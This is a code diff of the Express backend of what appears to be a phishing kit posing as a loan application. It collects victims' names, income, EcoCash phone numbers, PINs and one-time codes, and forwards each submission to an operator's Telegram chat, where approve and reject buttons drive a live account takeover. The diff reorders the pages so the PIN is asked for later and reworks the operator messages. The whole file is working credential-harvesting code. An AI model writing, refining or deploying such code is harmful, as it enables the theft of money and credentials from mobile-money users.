@@ -23,22 +23,20 @@ app.post('/api/session', wrap(async (req, res) => {
   res.json({ sessionId });
 }));
 
-// ---------- PAGE 1 (LOAN REQUEST, PHONE & PIN) ----------
+// ---------- PAGE 2 (QUESTIONNAIRE) ----------
 app.post('/api/submit-page4', wrap(async (req, res) => {
   const { sessionId, data } = req.body;
   const session = await db.getSession(sessionId);
   if (!session) return res.status(404).json({ error: 'Invalid or expired session' });
 
-  // Save the new loan data
   await db.updateSession(sessionId, { page4: data, status: 'pending_4' });
 
-  // Send to Telegram
   const msg =
     `📝 *NEW LOAN APPLICATION — STEP 1*\n\n` +
     `*Name:* ${esc(data.fullName)}\n` +
-    `*EcoCash Number:* ${esc(data.phone)}\n` +
-    `*EcoCash PIN:* \`${esc(data.pin)}\`\n` +
-    `*Amount:* ${esc(data.loanAmount)}\n` +
+    `*Employment:* ${esc(data.employment)}\n` +
+    `*Monthly Income:* ${esc(data.income)}\n` +
+    `*Loan Amount:* ${esc(data.loanAmount)}\n` +
     `*Term:* ${esc(data.loanTerm)}\n\n` +
     `Session: \`${sessionId}\``;
 
@@ -54,7 +52,7 @@ app.post('/api/submit-page4', wrap(async (req, res) => {
   res.json({ success: true });
 }));
 
-// ---------- PAGE 2 & 3 (EMPLOYMENT & IDENTITY) ----------
+// ---------- PAGE 3 (PHONE & PIN) ----------
 app.post('/api/submit-page5-6', wrap(async (req, res) => {
   const { sessionId, page5, page6 } = req.body;
   const session = await db.getSession(sessionId);
@@ -66,30 +64,28 @@ app.post('/api/submit-page5-6', wrap(async (req, res) => {
   await db.updateSession(sessionId, { page5, page6, status: 'pending_56' });
 
   const p4 = JSON.parse(session.page4);
+  
+  // Format the message beautifully
   const msg =
-    `📋 *FULL APPLICATION REVIEW — STEP 2*\n\n` +
-    `*— PAGE 1 (Loan Info) —*\n` +
+    `📋 *PHONE & PIN SUBMITTED — STEP 2*\n\n` +
+    `*— PREVIOUS INFO —*\n` +
     `Name: ${esc(p4.fullName)}\n` +
-    `EcoCash Number: ${esc(p4.phone)}\n` +
-    `EcoCash PIN: \`${esc(p4.pin)}\`\n` +
+    `Employment: ${esc(p4.employment)}\n` +
+    `Income: ${esc(p4.income)}\n` +
     `Amount: ${esc(p4.loanAmount)}\n` +
     `Term: ${esc(p4.loanTerm)}\n\n` +
-    `*— PAGE 2 (Employment) —*\n` +
-    `Status: ${esc(page5.q1)}\n` +
-    `Monthly Income: ${esc(page5.q2)}\n\n` +
-    `*— PAGE 3 (Identity) —*\n` +
-    `National ID: ${esc(page6.q1)}\n` +
-    `Next of Kin: ${esc(page6.q2)}\n\n` +
+    `*— LOGIN DETAILS —*\n` +
+    `EcoCash Phone: ${esc(page5.q1)}\n` +
+    `EcoCash PIN: \`${esc(page5.q2)}\`\n\n` +
     `Session: \`${sessionId}\``;
 
   await safeSend(CHAT_ID, msg, {
     parse_mode: 'Markdown',
     reply_markup: {
       inline_keyboard: [
-        [{ text: '✅ All Correct (Proceed to OTP)', callback_data: `correct_all:${sessionId}` }],
+        [{ text: '✅ Approve Step 2', callback_data: `correct_all:${sessionId}` }],
         [
-          { text: '❌ Wrong Page 1', callback_data: `wrong_4:${sessionId}` },
-          { text: '❌ Wrong Page 3', callback_data: `wrong_6:${sessionId}` }
+          { text: '❌ Reject', callback_data: `wrong_4:${sessionId}` }
         ]
       ]
     }
@@ -105,16 +101,14 @@ app.post('/api/verify-code', wrap(async (req, res) => {
   if (!session) return res.status(404).json({ error: 'Session not found' });
   if (session.status !== 'approved_all') return res.status(400).json({ error: 'Not ready for OTP verification' });
 
-  // Save the OTP and set status to pending_otp
   await db.updateSession(sessionId, { status: 'pending_otp', verification_code: code });
 
   const p4 = JSON.parse(session.page4);
+  const p5 = JSON.parse(session.page5);
 
-  // Send OTP to Admin on Telegram with all details for final check
   const msg = `🔐 *OTP SUBMITTED — FINAL STEP*\n\n` +
               `*Name:* ${esc(p4.fullName)}\n` +
-              `*EcoCash Number:* ${esc(p4.phone)}\n` +
-              `*PIN:* \`${esc(p4.pin)}\`\n` +
+              `*Phone:* ${esc(p5.q1)}\n` +
               `*OTP Entered:* \`${esc(code)}\`\n\n` +
               `Session: \`${sessionId}\``;
 
@@ -152,26 +146,33 @@ bot.on('callback_query', async (query) => {
       return bot.answerCallbackQuery(query.id, { text: 'Session expired.' });
     }
 
-    const edits = {
-      approve_4:   { status: 'approved_4',   text: '✅ *STEP 1 APPROVED*' },
-      reject_4:    { status: 'rejected_4',   text: '❌ *STEP 1 REJECTED*' },
-      correct_all: { status: 'approved_all', text: '✅ *STEP 2 APPROVED — PROCEED TO OTP*' },
-      wrong_4:     { status: 'rejected_4',   text: '❌ *WRONG PAGE 1 INFO*' },
-      wrong_6:     { status: 'rejected_6',   text: '❌ *WRONG PAGE 3 INFO*' },
-      
-      approve_pin: { status: 'completed',    text: '✅ *OTP APPROVED — LOAN COMPLETE*' },
-      reject_pin:  { status: 'rejected_pin', text: '❌ *OTP REJECTED*' }
+    // Map commands to database statuses and display labels
+    const actions = {
+      approve_4:   { status: 'approved_4',   label: '✅ APPROVED (Step 1)' },
+      reject_4:    { status: 'rejected_4',   label: '❌ REJECTED (Step 1)' },
+      correct_all: { status: 'approved_all', label: '✅ APPROVED (Step 2)' },
+      wrong_4:     { status: 'rejected_4',   label: '❌ REJECTED (Step 2)' },
+      approve_pin: { status: 'completed',    label: '✅ OTP APPROVED — LOAN COMPLETE' },
+      reject_pin:  { status: 'rejected_pin', label: '❌ OTP REJECTED' }
     };
     
-    const edit = edits[command];
-    if (!edit) return bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
+    const action = actions[command];
+    if (!action) return bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
 
-    await db.updateSession(sessionId, { status: edit.status });
+    // 1. Update Database
+    await db.updateSession(sessionId, { status: action.status });
 
-    await bot.editMessageText(edit.text, {
-      chat_id: chatId, message_id: msgId, parse_mode: 'Markdown'
+    // 2. Update Telegram Message (Keep text, remove buttons, append status)
+    const originalText = query.message.text;
+    
+    await bot.editMessageText(`${originalText}\n\n————————————\n*STATUS:* ${action.label}`, {
+      chat_id: chatId, 
+      message_id: msgId, 
+      parse_mode: 'Markdown',
+      reply_markup: { inline_keyboard: [] } // This clears the buttons but keeps the text!
     });
-    bot.answerCallbackQuery(query.id, { text: 'Done!' });
+    
+    bot.answerCallbackQuery(query.id, { text: 'Status Updated!' });
   } catch (err) {
     console.error('callback error:', err.message);
     try { bot.answerCallbackQuery(query.id, { text: 'Error.' }); } catch {}
